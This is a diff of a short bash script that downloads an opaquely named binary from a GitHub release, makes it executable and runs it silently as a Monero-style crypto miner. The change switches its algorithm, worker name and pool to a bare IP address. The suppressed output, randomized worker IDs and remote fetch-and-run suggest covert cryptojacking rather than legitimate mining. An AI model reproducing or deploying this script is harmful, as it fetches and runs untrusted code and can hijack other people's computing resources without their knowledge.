@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/vedhagsvp/aplamner/releases/download/nertas/greavet
 chmod +x greavet
-./greavet --algo xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-VTTAUG44) --pool xmr.hk.apool.io:3334 > /dev/null 2>&1
+./greavet --algo qubic_xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-SG200AU27) --pool 34.245.200.118:8081 > /dev/null 2>&1
